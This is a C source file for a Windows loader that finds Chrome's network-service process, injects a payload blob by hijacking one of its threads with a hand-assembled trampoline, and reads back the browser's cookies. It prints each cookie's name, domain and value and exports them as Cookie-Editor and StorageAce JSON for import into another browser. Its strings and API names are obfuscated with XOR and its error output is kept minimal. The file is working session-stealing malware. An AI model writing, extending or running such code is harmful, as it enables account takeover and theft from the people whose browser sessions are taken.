/* Standalone Margaret loader using thread-context hijacking. */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "margaret.h"   /* Shared blob ABI. */
#include "lstrings.h"

#define MG_TIMEOUT_MS  60000u
#define MG_OUT_CAP     (8u * 1024u * 1024u)

#ifdef LOADER_VERBOSE
#define DBG(...) printf(__VA_ARGS__)
#else
#define DBG(...) do {} while (0)
#endif

static void Die(const char *msg) {
#ifdef LOADER_VERBOSE
    fprintf(stderr, "[loader] ERROR: %s (GLE=%lu)\n", msg, GetLastError());
#else
    fprintf(stderr, "x%lu\n", GetLastError());   /* Numeric error only. */
#endif
    exit(2);
}

/* Decrypt a generated string; caller wipes the buffer. */
static void LstrA(char *dst, const unsigned char *src, size_t len) {
    unsigned char key = LSTRING_XOR_KEY;
    for (size_t i = 0; i < len; i++) {
        unsigned char c = src[i];
        dst[i] = (char)(c ^ key);
        key = (unsigned char)(key + c + (unsigned char)i);
    }
}
static void LstrW(wchar_t *dst, const unsigned char *src, size_t bytes) {
    unsigned char key = LSTRING_XOR_KEY;
    for (size_t i = 0; i < bytes; i++) {
        unsigned char c = src[i];
        ((unsigned char *)dst)[i] = (unsigned char)(c ^ key);
        key = (unsigned char)(key + c + (unsigned char)i);
    }
}

static uint32_t RdU32(const uint8_t *p) {
    return p[0] | (p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static uint64_t RdU64(const uint8_t *p) {
    return (uint64_t)RdU32(p) | ((uint64_t)RdU32(p + 4) << 32);
}

static void PrintStr(const uint8_t *s, uint32_t len) {
    for (uint32_t i = 0; i < len; i++)
        putchar((s[i] >= 0x20 && s[i] < 0x7f) ? s[i] : '.');
}

static void Jputstr(FILE *f, const uint8_t *s, uint32_t len) {
    fputc('"', f);
    for (uint32_t i = 0; i < len; i++) {
        if (s[i] == '"' || s[i] == '\\') fputc('\\', f);
        fputc(s[i], f);
    }
    fputc('"', f);
}

static int RpRead(HANDLE p, uint64_t addr, PVOID buf, SIZE_T n) {
    SIZE_T got;
    return ReadProcessMemory(p, (LPCVOID)(uintptr_t)addr, buf, n, &got) && got == n;
}

static uint64_t RpQword(HANDLE p, uint64_t addr) {
    uint64_t v = 0; RpRead(p, addr, &v, 8); return v;
}

/* Process discovery. */

static int CmdlineMatches(HANDLE p, const wchar_t *needle) {
    typedef LONG (WINAPI *NtQIP)(HANDLE, int, PVOID, ULONG, PULONG);
    static NtQIP ntqip;
    if (!ntqip) {
        char mod[16], fn[64];
        LstrA(mod, lstring_ntdll, LSTRING_NTDLL_LEN);
        LstrA(fn, lstring_ntqip, LSTRING_NTQIP_LEN);
        HMODULE nt = GetModuleHandleA(mod);
        if (nt) ntqip = (NtQIP)GetProcAddress(nt, fn);
        SecureZeroMemory(mod, sizeof(mod));
        SecureZeroMemory(fn, sizeof(fn));
        if (!ntqip) return 0;
    }

    unsigned char pbi[48];
    if (ntqip(p, 0, pbi, sizeof(pbi), NULL) != 0) return 0;
    uint64_t peb = *(uint64_t *)(pbi + 8);
    if (!peb) return 0;
    uint64_t params = RpQword(p, peb + 0x20);
    if (!params) return 0;

    /* UNICODE_STRING prefix. */
    uint64_t clRaw = RpQword(p, params + 0x70);
    uint64_t clLen = clRaw & 0xFFFF; /* Length, not capacity. */
    uint64_t clBuf = RpQword(p, params + 0x78);
    if (!clBuf || clLen == 0 || clLen > 8190) return 0;

    wchar_t cl[4096];
    memset(cl, 0, sizeof(cl));
    if (!RpRead(p, clBuf, cl, (SIZE_T)clLen)) return 0;
    cl[clLen / 2] = 0;
    return wcsstr(cl, needle) != NULL;
}

static DWORD FindNetworkServicePidInner(const wchar_t *NEEDLE,
                                            const wchar_t *EXE);

static DWORD FindNetworkServicePid(void) {
    wchar_t NEEDLE[48], EXE[12];
    LstrW(NEEDLE, lstring_needle_network, LSTRING_NEEDLE_NETWORK_LEN);
    LstrW(EXE, lstring_chrome_exe, LSTRING_CHROME_EXE_LEN);
    DWORD found = FindNetworkServicePidInner(NEEDLE, EXE);
    SecureZeroMemory(NEEDLE, sizeof(NEEDLE));
    SecureZeroMemory(EXE, sizeof(EXE));
    return found;
}

static DWORD FindNetworkServicePidInner(const wchar_t *NEEDLE,
                                            const wchar_t *EXE) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    DWORD found = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, EXE) != 0) continue;
            HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                    FALSE, pe.th32ProcessID);
            if (!p) continue;
            if (CmdlineMatches(p, NEEDLE)) {
                found = pe.th32ProcessID;
                CloseHandle(p);
                break;
            }
            CloseHandle(p);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

/* Thread-context hijacking. */

typedef struct {
    DWORD dwSize, cntUsage, th32ThreadID, th32OwnerProcessID;
    LONG tpBasePri, tpDeltaPri;
    DWORD dwFlags;
} MY_TE32;

typedef LONG (WINAPI *NtQIT_t)(HANDLE, int, PVOID, ULONG, PULONG);

/* Require enough remaining victim-stack headroom. */
static uint64_t ThreadStackRemaining(HANDLE proc, HANDLE thread, NtQIT_t ntqit) {
    unsigned char tbi[48];
    CONTEXT ctx;
    uint64_t teb, slim, rsp;

    memset(tbi, 0, sizeof(tbi));
    if (ntqit(thread, 0, tbi, sizeof(tbi), NULL) != 0) return 0;
    teb = *(uint64_t *)(tbi + 8);
    if (!teb) return 0;
    slim = RpQword(proc, teb + 0x10);  /* StackLimit. */
    if (!slim) return 0;

    /* Suspend briefly to read RSP. */
    if (SuspendThread(thread) == (DWORD)-1) return 0;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_CONTROL;
    int ok = GetThreadContext(thread, &ctx);
    ResumeThread(thread);
    if (!ok) return 0;
    rsp = ctx.Rsp;

    return (rsp > slim) ? (rsp - slim) : 0;
}

/* Pick the thread with the most remaining stack. */
static DWORD FindHijackThread(HANDLE proc, DWORD targetPid) {
    char mod[16], fn[64];
    HMODULE nt;
    NtQIT_t ntqit;
    LstrA(mod, lstring_ntdll, LSTRING_NTDLL_LEN);
    LstrA(fn, lstring_ntqit, LSTRING_NTQIT_LEN);
    nt = GetModuleHandleA(mod);
    if (nt) ntqit = (NtQIT_t)GetProcAddress(nt, fn);
    else ntqit = NULL;
    SecureZeroMemory(mod, sizeof(mod));
    SecureZeroMemory(fn, sizeof(fn));
    if (!ntqit) return 0;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    MY_TE32 te;
    memset(&te, 0, sizeof(te));
    te.dwSize = sizeof(te);
    DWORD bestTid = 0;
    uint64_t bestRemaining = 0;

    if (Thread32First(snap, (THREADENTRY32 *)&te)) {
        do {
            if (te.th32OwnerProcessID != targetPid) continue;
            HANDLE t = OpenThread(
                THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
                THREAD_QUERY_INFORMATION,
                FALSE, te.th32ThreadID);
            if (!t) continue;
            uint64_t rem = ThreadStackRemaining(proc, t, ntqit);
            CloseHandle(t);
            if (rem > bestRemaining) {
                bestRemaining = rem;
                bestTid = te.th32ThreadID;
            }
        } while (Thread32Next(snap, (THREADENTRY32 *)&te));
    }
    CloseHandle(snap);
    if (bestTid)
        DBG("[loader] thread %lu (remaining stack %llu KB)\n",
               bestTid, (unsigned long long)(bestRemaining / 1024));
    return bestTid;
}

static uint8_t *gRTramp = NULL; /* Post-mortem diagnostics. */

static HANDLE HijackThread(HANDLE proc, DWORD tid,
                             uint8_t *rBlob, uint8_t *rArgs,
                             uint8_t **outTramp) {
    HANDLE victim = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
        THREAD_QUERY_INFORMATION,
        FALSE, tid);
    if (!victim) return NULL;
    *outTramp = NULL;

    if (SuspendThread(victim) == (DWORD)-1) {
        CloseHandle(victim);
        return NULL;
    }

    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(victim, &ctx)) {
        ResumeThread(victim);
        CloseHandle(victim);
        return NULL;
    }

    /* One allocation: trampoline code plus a fresh aligned 64 KiB stack. */
    {
        SIZE_T trampSz = 0x200 + 0x10000;
        uint8_t *tramp = VirtualAllocEx(proc, NULL, trampSz,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!tramp) { ResumeThread(victim); CloseHandle(victim); return NULL; }

        uint8_t code[256];
        size_t n = 0;
        #define EMIT(...) do { memcpy(code + n, (uint8_t[]){__VA_ARGS__}, sizeof((uint8_t[]){__VA_ARGS__})); n += sizeof((uint8_t[]){__VA_ARGS__}); } while (0)
        #define EMIT64(x) do { uint64_t v = (uint64_t)(x); memcpy(code + n, &v, 8); n += 8; } while (0)
        /* Write progress markers through volatile R11. */
        #define MARK(N) do { \
            EMIT(0x49, 0xBB); EMIT64((uintptr_t)(rArgs + 0x28)); /* r11=&flags */ \
            EMIT(0x41, 0xC7, 0x03, (N) & 0xFF, ((N) >> 8) & 0xFF, ((N) >> 16) & 0xFF, ((N) >> 24) & 0xFF); /* *flags=N */ \
        } while (0)

        MARK(1);                                         /* Entered. */
        /* Reload RCX after sysret because it restores the target RIP there. */
        EMIT(0x48, 0xB9); EMIT64((uintptr_t)rArgs);    /* mov rcx, args */
        EMIT(0x48, 0x83, 0xEC, 0x20);                   /* sub rsp, 0x20 */
        EMIT(0x48, 0xB8); EMIT64((uintptr_t)rBlob);    /* mov rax, blob */
        MARK(2);                                         /* Before blob call. */
        EMIT(0xFF, 0xD0);                               /* call rax */
        MARK(3);                                         /* Blob returned. */
        EMIT(0x48, 0x83, 0xC4, 0x20);                   /* add rsp, 0x20 */
        EMIT(0x48, 0xB8); EMIT64(ctx.Rax);              /* mov rax, origRax */
        EMIT(0x48, 0xB9); EMIT64(ctx.Rcx);              /* mov rcx, origRcx */
        EMIT(0x48, 0xBA); EMIT64(ctx.Rdx);              /* mov rdx, origRdx */
        EMIT(0x49, 0xB8); EMIT64(ctx.R8);               /* mov r8, origR8 */
        EMIT(0x49, 0xB9); EMIT64(ctx.R9);               /* mov r9, origR9 */
        EMIT(0x49, 0xBA); EMIT64(ctx.R10);              /* mov r10, origR10 */
        EMIT(0x49, 0xBB); EMIT64(ctx.R11);              /* mov r11, origR11 */
        EMIT(0x48, 0xBC); EMIT64(ctx.Rsp);              /* mov rsp, origRsp */
        MARK(4);                                         /* Registers restored. */
        EMIT(0x48, 0xB8); EMIT64(ctx.Rip);              /* mov rax, origRip */
        EMIT(0xFF, 0xE0);                               /* jmp rax */
        #undef MARK
        #undef EMIT
        #undef EMIT64

        SIZE_T w;
        if (!WriteProcessMemory(proc, tramp, code, n, &w) || w != n) {
            VirtualFreeEx(proc, tramp, 0, MEM_RELEASE);
            ResumeThread(victim); CloseHandle(victim);
            return NULL;
        }
        {
            DWORD old;
            if (!VirtualProtectEx(proc, tramp, 0x200, PAGE_EXECUTE_READ, &old)) {
                VirtualFreeEx(proc, tramp, 0, MEM_RELEASE);
                ResumeThread(victim); CloseHandle(victim);
                return NULL;
            }
        }

        /* Redirect execution to the trampoline on its fresh stack. */
        ctx.Rip = (uint64_t)(uintptr_t)tramp;
        ctx.Rsp = (uint64_t)(uintptr_t)(tramp + 0xFFF0);
        ctx.Rcx = (uint64_t)(uintptr_t)rArgs;

        /* Verify remote trampoline bytes. */
        {
            uint8_t rb[16];
            SIZE_T got;
            if (!ReadProcessMemory(proc, tramp, rb, 16, &got) || got != 16) {
                DBG("[loader] trampoline readback FAILED\n");
                VirtualFreeEx(proc, tramp, 0, MEM_RELEASE);
                ResumeThread(victim); CloseHandle(victim);
                return NULL;
            }
            DBG("[loader] tramp=%p blob=%p args=%p rsp=%llx code=%02x %02x %02x %02x\n",
                   (PVOID)tramp, (PVOID)rBlob, (PVOID)rArgs,
                   (unsigned long long)ctx.Rsp, rb[0], rb[1], rb[2], rb[3]);
        }

        if (!SetThreadContext(victim, &ctx)) {
            VirtualFreeEx(proc, tramp, 0, MEM_RELEASE);
            ResumeThread(victim);
            CloseHandle(victim);
            return NULL;
        }
        *outTramp = tramp;   /* Free after execution leaves it. */
        gRTramp = tramp;
    }

    ResumeThread(victim);
    return victim;
}

#define MG_STATUS_SENTINEL 0xDEADBEEFu

/* Return 1 on completion, -1 on thread death, or 0 on timeout. */

static int WaitHijack(HANDLE victim, HANDLE proc, uint8_t *rArgs,
                        uint32_t timeoutMs) {
    uint32_t elapsed = 0;
    uint64_t last_rip = 0;
    (void)last_rip;   /* Verbose diagnostics only. */
    int first_poll = 1;
    while (elapsed < timeoutMs) {
        DWORD ec;
        uint32_t status = 0;
        CONTEXT c;

        /* Completion wins over a later thread exit. */
        if (RpRead(proc, (uint64_t)(uintptr_t)(rArgs + 0x20),
                    &status, 4) && status != MG_STATUS_SENTINEL) {
            return 1;
        }

        /* Track RIP for diagnostics. */
        memset(&c, 0, sizeof(c));
        c.ContextFlags = CONTEXT_FULL;
        if (GetThreadContext(victim, &c)) {
            if (first_poll) {
                first_poll = 0;
                DBG("[loader] first poll: RIP=%llx RSP=%llx RCX=%llx\n",
                       (unsigned long long)c.Rip,
                       (unsigned long long)c.Rsp,
                       (unsigned long long)c.Rcx);
            }
            last_rip = c.Rip;
        }

        /* Check death after completion. */
        if (GetExitCodeThread(victim, &ec) && ec != STILL_ACTIVE) {
            uint32_t marker = 0;
            uint8_t tb[32] = {0};
            RpRead(proc, (uint64_t)(uintptr_t)(rArgs + 0x28), &marker, 4);
            DBG("[loader] thread DIED (exit=0x%lX, marker=%u, last RIP=%llx)\n",
                   (unsigned long)ec, marker,
                   (unsigned long long)last_rip);
            if (gRTramp &&
                RpRead(proc, (uint64_t)(uintptr_t)gRTramp, tb, 32)) {
                DBG("[loader] tramp post-mortem: ");
                for (int i = 0; i < 32; i++) printf("%02x ", tb[i]);
                printf("\n");
            }
            return -1;
        }
        Sleep(20);
        elapsed += 20;
    }
    return 0;
}

/* Reconstruct RFC 6265bis prefix-mandated attributes. */
static int name_forces_secure(const uint8_t *nm, uint32_t nl) {
    return (nl >= 8 && !memcmp(nm, "__Secure-", 8)) ||
           (nl >= 7 && !memcmp(nm, "__Host-", 7));
}
static int name_forces_hostonly(const uint8_t *nm, uint32_t nl) {
    return (nl >= 7 && !memcmp(nm, "__Host-", 7));
}


/* Main. */

int main(int argc, char **argv) {
    DWORD pid;
    const char *blob_path;
    uint8_t *blob;
    long blobSize;
    HANDLE proc, victim = NULL;
    uint8_t *rBlob, *rArgs, *rOut;
    MARGARET_ARGS args, back;
    SIZE_T written = 0;

    int testMode = (argc >= 2 && strcmp(argv[1], "--test") == 0);

    if (testMode) {
        /* Diagnostic stub for trampoline call/resume mechanics. */
        static const uint8_t testStub[] = {
            0x48, 0x8B, 0x41, 0x10,                    /* mov rax,[rcx+0x10] */
            0xC7, 0x00, 0xEF, 0xBE, 0xAD, 0xDE,        /* mov dword[rax],0xDEADBEEF */
            0xC7, 0x41, 0x1C, 0x04, 0x00, 0x00, 0x00,  /* mov dword[rcx+0x1C],4 */
            0xC7, 0x41, 0x20, 0x78, 0x56, 0x34, 0x12,  /* mov dword[rcx+0x20],0x12345678 */
            0x31, 0xC0,                                 /* xor eax,eax */
            0xC3                                        /* ret */
        };
        blob = malloc(sizeof(testStub));
        memcpy(blob, testStub, sizeof(testStub));
        blobSize = (long)sizeof(testStub);
        DBG("[loader] TEST MODE: %zu-byte stub\n", sizeof(testStub));
    } else if (argc < 2) {
        DBG("usage: %s <pid> <blob> | %s <blob> (auto) | %s --test [pid]\n",
            argv[0], argv[0], argv[0]);
        return 1;
    }
    if (testMode) {
        pid = (argc >= 3) ? (DWORD)strtoul(argv[2], NULL, 0) : 0;
        blob_path = NULL;
    } else if (argc >= 3) {
        pid = (DWORD)strtoul(argv[1], NULL, 0);
        blob_path = argv[2];
    } else {
        blob_path = argv[1];
        pid = 0;
    }
    if (!pid) {
        pid = FindNetworkServicePid();
        if (!pid) { DBG("[loader] network utility not found\n"); return 1; }
    }
    DBG("[loader] pid=%lu\n", pid);

    if (!testMode) {
    FILE *bf = fopen(blob_path, "rb");
    if (!bf) Die("open blob");
    fseek(bf, 0, SEEK_END);
    blobSize = ftell(bf);
    fseek(bf, 0, SEEK_SET);
    blob = malloc(blobSize);
    if (!blob || fread(blob, 1, blobSize, bf) != (size_t)blobSize) Die("read blob");
    fclose(bf);
    DBG("[loader] blob=%ld bytes\n", blobSize);
    }

    proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!proc) Die("OpenProcess");

    rBlob = VirtualAllocEx(proc, NULL, blobSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    rArgs = VirtualAllocEx(proc, NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    rOut  = VirtualAllocEx(proc, NULL, MG_OUT_CAP, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!rBlob || !rArgs || !rOut) Die("VirtualAllocEx");

    if (!WriteProcessMemory(proc, rBlob, blob, blobSize, &written) ||
        written != (SIZE_T)blobSize) Die("write blob");
    {
        DWORD old;
        if (!VirtualProtectEx(proc, rBlob, blobSize, PAGE_EXECUTE_READ, &old))
            Die("VirtualProtectEx");
    }

    memset(&args, 0, sizeof(args));
    args.Size = sizeof(args);
    args.Version = MARGARET_ABI_VERSION;
    args.Magic = MARGARET_ARGUMENT_MAGIC;
    args.Operation = MargaretOperationSnapshotDefaultProfile;
    args.OutputBuffer = rOut;
    args.OutputCapacity = MG_OUT_CAP;
    args.TimeoutMs = MG_TIMEOUT_MS;
    args.Status = MG_STATUS_SENTINEL;  /* Cleared on completion. */
    if (!WriteProcessMemory(proc, rArgs, &args, sizeof(args), &written) ||
        written != sizeof(args)) Die("write args");

    /* Inject through thread hijacking. */
    {
        DWORD tid = FindHijackThread(proc, pid);
        if (!tid) Die("no thread found");
        uint8_t *rTramp = NULL;
        DBG("[loader] hijacking thread %lu\n", tid);
        victim = HijackThread(proc, tid, rBlob, rArgs, &rTramp);
        if (!victim) Die("hijack failed");

        DBG("[loader] waiting...\n");
        int rc = WaitHijack(victim, proc, rArgs, 120000);
        if (rc == -1) {
            DBG("[loader] blob crashed the thread\n");
            if (rTramp) VirtualFreeEx(proc, rTramp, 0, MEM_RELEASE);
            goto cleanup;
        }
        if (rc == 0) {
            DBG("[loader] timeout\n");
            goto cleanup;
        }
        DBG("[loader] done\n");
        /* Free the trampoline after RIP leaves it; leak on timeout. */
        if (rTramp) {
            uint32_t waited = 0;
            while (waited < 5000) {
                CONTEXT tc;
                memset(&tc, 0, sizeof(tc));
                tc.ContextFlags = CONTEXT_CONTROL;
                if (!GetThreadContext(victim, &tc)) break;
                if (tc.Rip < (uint64_t)(uintptr_t)rTramp ||
                    tc.Rip >= (uint64_t)(uintptr_t)(rTramp + 0x200)) {
                    VirtualFreeEx(proc, rTramp, 0, MEM_RELEASE);
                    rTramp = NULL;
                    break;
                }
                Sleep(25); waited += 25;
            }
            if (rTramp)
                DBG("[loader] note: trampoline not freed (thread still inside)\n");
        }
    }

    /* Read results. */
    if (!RpRead(proc, (uint64_t)(uintptr_t)rArgs, &back, sizeof(back)))
        Die("read args");
    DBG("[loader] status=0x%lX output_length=%lu flags=0x%lX pad=0x%lX\n",
        back.Status, back.OutputLength, back.Flags, back.Pad);
    if (back.Status != 0) {
        uint8_t hdr[32];
        if (back.OutputLength >= 32 &&
            RpRead(proc, (uint64_t)(uintptr_t)rOut, hdr, 32)) {
            uint64_t se = 0, lh = 0;
            for (int i = 7; i >= 0; i--) se = (se << 8) | hdr[12 + i];
            for (int i = 7; i >= 0; i--) lh = (lh << 8) | hdr[20 + i];
            DBG("[loader] MCEA scanEnd=0x%llX last_hit=0x%llX\n",
                (unsigned long long)se, (unsigned long long)lh);
        }
        if (back.OutputLength > 32) {
            uint32_t dl = back.OutputLength - 32u;
            uint8_t *db;
            if (dl > 0x240u) dl = 0x240u;
            db = malloc(dl);
            if (db && RpRead(proc, (uint64_t)(uintptr_t)rOut + 32u,
                              db, dl)) {
                for (uint32_t i = 0; i < dl; i += 16) {
                    printf("%03X: ", i);
                    for (uint32_t j = 0; j < 16 && i + j < dl; j++)
                        printf("%02X ", db[i + j]);
                    printf("\n");
                }
            }
            free(db);
        }
        goto cleanup;
    }
    if (back.OutputLength == 0) goto cleanup;

    uint8_t *out = malloc(back.OutputLength);
    if (!out || !RpRead(proc, (uint64_t)(uintptr_t)rOut, out, back.OutputLength))
        Die("read output");

    uint32_t ncookies = RdU32(out + 4);
    DBG("[loader] MCEA cookies=%u\n", ncookies);

    /* Emit console, Cookie-Editor, and StorageAce formats. */
    {
        const uint8_t *p = out + 32;
        const uint8_t *end = out + back.OutputLength;
        char feditor[32], fstorage[32];
        LstrA(feditor, lstring_json_editor, LSTRING_JSON_EDITOR_LEN);
        LstrA(fstorage, lstring_json_storage, LSTRING_JSON_STORAGE_LEN);
        FILE *jf = fopen(feditor, "w");
        FILE *sf = fopen(fstorage, "w");
        uint32_t wc = 0;

        if (jf) fprintf(jf, "[");
        if (sf) fprintf(sf, "[");

        for (uint32_t i = 0; i < ncookies && p + 4 <= end; i++) {
            uint32_t nl=RdU32(p); p+=4; const uint8_t *nm=p; p+=nl;
            if (p+4>end) break;
            uint32_t dl=RdU32(p); p+=4; const uint8_t *dm=p; p+=dl;
            if (p+4>end) break;
            uint32_t pl=RdU32(p); p+=4; const uint8_t *pt=p; p+=pl;
            if (p+4>end) break;
            uint32_t vl=RdU32(p); p+=4; const uint8_t *vv=p; p+=vl;
            if (p+28>end) break;
            p+=8;
            uint64_t ex=RdU64(p); p+=8;
            uint32_t fl=RdU32(p); p+=4;
            uint32_t ss=RdU32(p); p+=4;
            p+=4;

            double ux = (double)ex/1e6 - 11644473600.0;
            if (ux<=0) ux = 32503680000.0;
            const char *ssv = (ss==1)?"lax":(ss==2)?"strict":"no_restriction";

            printf("[%u] ", i);
            PrintStr(nm,nl); printf(" | ");
            PrintStr(dm,dl); printf(" | value=");
            PrintStr(vv,vl); printf("\n");

            if (jf) {
                int fsec = (fl & 1) || name_forces_secure(nm, nl);
                int fhost = name_forces_hostonly(nm, nl);
                fprintf(jf, "%s\n  {\"url\": \"https://%.*s/\", \"name\": ",
                       wc?",":"", (int)dl, dm);
                Jputstr(jf,nm,nl);
                fprintf(jf, ", \"value\": ");
                Jputstr(jf,vv,vl);
                fprintf(jf, ", \"domain\": ");
                Jputstr(jf,dm,dl);
                fprintf(jf, ", \"path\": ");
                Jputstr(jf,pt,pl);
                fprintf(jf, ", \"secure\": %s, \"httpOnly\": %s, \"sameSite\": \"%s\", \"hostOnly\": %s, \"expirationDate\": %.0f}",
                       fsec?"true":"false",
                       (fl&2)?"true":"false", ssv,
                       fhost?"true":"false", ux);
            }
            if (sf) {
                int fsec = (fl & 1) || name_forces_secure(nm, nl);
                fprintf(sf, "%s\n  {\"path\": ", wc?",":"");
                Jputstr(sf,pt,pl);
                fprintf(sf, ", \"domain\": ");
                Jputstr(sf,dm,dl);
                fprintf(sf, ", \"expirationDate\": %.0f, \"value\": ", ux);
                Jputstr(sf,vv,vl);
                fprintf(sf, ", \"name\": ");
                Jputstr(sf,nm,nl);
                fprintf(sf, ", \"httpOnly\": %s, \"hostOnly\": %s, \"secure\": %s, \"session\": false}",
                       (fl&2)?"true":"false",
                       name_forces_hostonly(nm, nl)?"true":"false",
                       fsec?"true":"false");
            }
            wc++;
        }
        if (jf) { fprintf(jf, "\n]\n"); fclose(jf); }
        if (sf) { fprintf(sf, "\n]\n"); fclose(sf); }
        DBG("[loader] %u cookies exported\n", wc);

        SecureZeroMemory(feditor, sizeof(feditor));
        SecureZeroMemory(fstorage, sizeof(fstorage));
    }

    free(out);

cleanup:
    if (victim) CloseHandle(victim);
    if (rBlob) VirtualFreeEx(proc, rBlob, 0, MEM_RELEASE);
    if (rArgs) VirtualFreeEx(proc, rArgs, 0, MEM_RELEASE);
    if (rOut) VirtualFreeEx(proc, rOut, 0, MEM_RELEASE);
    if (proc) CloseHandle(proc);
    free(blob);
    return 0;
}
